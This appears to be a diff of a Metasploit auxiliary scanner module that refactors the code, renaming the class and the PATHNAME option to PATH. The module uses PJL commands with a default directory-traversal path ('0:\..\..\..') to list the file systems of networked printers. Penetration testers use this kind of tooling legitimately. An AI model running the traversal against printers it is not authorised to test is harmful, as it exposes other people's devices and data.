@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require "msf/core"
 require "rex/proto/pjl"
 
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -34,19 +32,19 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options([
       Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),
-      OptString.new("PATHNAME", [true, "Pathname", '0:\..\..\..'])
-    ], self.class)
+      OptString.new("PATH", [true, "Remote path", '0:\..\..\..'])
+    ])
   end
 
   def run_host(ip)
-    pathname = datastore["PATHNAME"]
+    path = datastore["PATH"]
 
     connect
     pjl = Rex::Proto::PJL::Client.new(sock)
     pjl.begin_job
 
-    pjl.fsinit(pathname[0..1])
-    listing = pjl.fsdirlist(pathname)
+    pjl.fsinit(path[0..1])
+    listing = pjl.fsdirlist(path)
 
     pjl.end_job
     disconnect
@@ -62,5 +60,4 @@ class Metasploit4 < Msf::Auxiliary
       )
     end
   end
-
 end
